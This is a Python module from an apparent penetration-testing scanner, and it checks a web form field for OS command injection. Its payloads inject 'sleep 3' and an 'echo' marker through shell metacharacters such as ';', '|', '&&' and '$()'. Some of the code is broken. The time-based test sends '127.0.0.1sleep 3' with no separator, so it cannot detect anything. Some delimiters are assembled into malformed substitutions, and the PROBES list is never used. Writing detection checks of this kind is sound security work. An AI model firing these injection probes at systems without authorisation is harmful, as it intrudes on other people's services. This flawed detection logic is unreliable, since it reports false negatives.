"""Command injection detection check (from skills/penetration-testing/command-injection.md).

Strategy: time-based `sleep` via common injection metas (`;`, `|`, `&&`, `$()`)
and a benign `echo` marker that appears in the response.
"""
from __future__ import annotations

import time

from ..scoring import Finding
from . import BaseCheck

CHECK_CLASS = "CommandInjectionCheck"

MARKER = "hivebreach_cmdi_xyz"
SLEEP_CMD = "sleep 3"
DELIMITERS = [";", "|", "&&", "\n", "$()", "`"]
PROBES = [
    ";sleep 3",
    "|sleep 3",
    "&&sleep 3",
    ";echo hivebreach_cmdi_xyz",
    "|echo hivebreach_cmdi_xyz",
    "&&echo$IFS hivebreach_cmdi_xyz",
    "$(sleep 3)",
    "`sleep 3`",
]


class CommandInjectionCheck(BaseCheck):
    name = "command_injection"
    skill_playbook = "skills/penetration-testing/command-injection.md"
    mitre = "T1059"
    owasp = "A03:2021"

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.targets = [
            ("/vulnerabilities/exec/", "ip", "POST"),
        ]

    def run(self) -> list[Finding]:
        findings: list[Finding] = []
        for path, param, method in self.targets:
            url = self.base_url + path
            # 1) echo-marker test
            for delim in DELIMITERS:
                data = {param: f"127.0.0.1{delim}echo {MARKER}"}
                try:
                    r = self.session.post(url, data=data, timeout=self.timeout)
                except Exception:
                    continue
                if r is not None and MARKER in r.text:
                    findings.append(self._finding(
                        "command_injection", path, method, "command_injection",
                        severity="critical",
                        detected_at=time.time(),
                        notes="marker echoed via %s" % repr(delim),
                    ))
                    return findings
            # 2) time-based sleep test
            t0 = time.time()
            data = {param: f"127.0.0.1{SLEEP_CMD}"}
            try:
                r = self.session.post(url, data=data, timeout=self.timeout)
            except Exception:
                r = None
            elapsed = time.time() - t0
            if r is not None and elapsed >= 2.5:
                findings.append(self._finding(
                    "command_injection", path, method, "command_injection",
                    severity="critical",
                    detected_at=time.time(),
                    notes="time-based command injection (%.1fs)" % elapsed,
                ))
        return findings
